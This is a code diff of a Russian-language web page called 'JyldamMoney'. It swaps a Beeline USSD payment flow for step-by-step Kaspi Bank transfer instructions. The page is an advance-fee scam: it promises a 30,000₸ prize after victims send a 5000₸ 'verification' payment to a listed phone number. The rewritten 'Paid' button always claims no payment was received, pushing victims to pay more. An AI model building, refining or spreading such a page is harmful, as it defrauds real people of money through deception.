@@ -5,11 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>JyldamMoney</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-
-  <link rel="icon" type="image/png" sizes="64x64" href="logo.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="logo.png">
-  <link rel="apple-touch-icon" href="logo.png">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" sizes="32x32" href="/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/logo.png">
+  <link rel="apple-touch-icon" href="/logo.png">
   <style>
     * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
     body { margin:0; background:#111; color:#fff; min-height:100vh; display:flex; justify-content:center; align-items:center;}
@@ -35,8 +33,7 @@
     .error-msg { margin-top:6px; font-size:12px; color:#ff6b6b; display:none;}
     input.error, textarea.error { border-color:#ff6b6b !important; box-shadow:0 0 0 2px rgba(255,107,107,0.15);}
     button:disabled { opacity:0.5; cursor:not-allowed; transform:none !important; box-shadow:none !important;}
-    /* FadeIn для Kaspi Donation виджетов */
-    #kaspi-goal, #kaspi-last { animation:fadeIn 0.6s ease; margin-bottom:20px;}
+    .instructions { background:#222; padding:16px; border-radius:12px; font-size:14px; color:#ccc; line-height:1.5; margin-bottom:20px;}
   </style>
 </head>
 <body>
@@ -86,22 +83,39 @@
     <button class="btn" onclick="goTo(5)">Подтвердить</button>
   </div>
 
-  <!-- PAGE 5: CRYPTO PAYMENT -->
-    <!-- PAGE 5: SUBSCRIPTION (Beeline) -->
-    <!-- PAGE 5: SUBSCRIPTION (Beeline) -->
-    <div class="page" id="page5">
-        <h2>Подписка / Пополнение</h2>
+  <!-- PAGE 5: KASPI PAYMENT -->
+  <div class="page" id="page5">
+    <h2>Подписка / Пополнение</h2>
 
-        <p>В открывшемся окне введите этот номер телефона +7 771 510 5367 и сумму 5000₸, чтобы пройти проверку и получить 30 000₸ бонус.</p>
+    <p style="font-size:14px; color:#ccc; line-height:1.6; margin-bottom:16px;">
+      <strong>Зачем нужна оплата 5000₸?</strong><br><br>
+      Оплата необходима для подтверждения, что ваш банковский счёт активен и принадлежит вам.
+      Это стандартная проверка перед переводом выигрыша.<br><br>
 
-        <a href="https://beeline.kz/ru/top-up" class="btn" id="beelinePayBtn">Оплатить через Beeline</a>
+      После подтверждения оплаты мы отправим вам выигрыш <strong>30 000₸</strong> 
+      на тот же счёт, с которого был выполнен перевод.
+    </p>
 
-        <div class="note">
-            Оплата производится через Beeline. Введите сумму и нажмите "Оплатить".
-        </div>
+    <div class="instructions">
+        <strong>Инструкция по оплате через Kaspi Bank:</strong>
+        <ol>
+            <li>Откройте приложение <strong>Kaspi.kz</strong> на телефоне.</li>
+            <li>Перейдите во вкладку <strong>Переводы</strong>.</li>
+            <li>Выберите <strong>Перевод по номеру</strong>.</li>
+            <li>Введите номер: <strong>+7 771 510 5367</strong></li>
+            <li>Введите сумму: <strong>5000₸</strong></li>
+            <li>В комментарии напишите своё <strong>ФИО</strong>.</li>
+            <li>Нажмите <strong>Оплатить</strong> и подтвердите перевод.</li>
+            <li>Вернитесь на эту страницу и нажмите кнопку <strong>Оплачено</strong>.</li>
+            <li>Дождитесь проверки (около 2 минут) — доступ будет открыт автоматически.</li>
+        </ol>
     </div>
 
+    <button class="btn" id="kaspiPayBtn">Оплачено</button>
 
+    <div class="note">
+        Пожалуйста, следуйте инструкции выше. Если вы не оплатили, система уведомит вас.
+    </div>
   </div>
 
 </div>
@@ -174,22 +188,12 @@
     }
   }
 
-  /* Crypto Payment */
-    const payBtn = document.getElementById('beelinePayBtn');
-    const numberInput = document.getElementById('beelineNumber');
-    const amountInput = document.getElementById('beelineAmount');
-
-    payBtn.addEventListener('click', () => {
-        const amount = parseInt(amountInput.value);
-        if (!amount || amount <= 0) {
-        alert('Введите корректную сумму для оплаты');
-        return;
-        }
-
-        // Формируем USSD ссылку
-        const ussd = `*700*${numberInput.value.replace(/\D/g,'')}*${amount}#`;
-        window.location.href = `tel:${ussd}`;
-    });
+  /* Kaspi Button: кастомный alert */
+  const kaspiBtn = document.getElementById('kaspiPayBtn');
+  kaspiBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      alert("Вы пока не совершили оплату. Пожалуйста, следуйте инструкции выше, чтобы получить доступ к бонусу.");
+  });
 </script>
 
 </body>
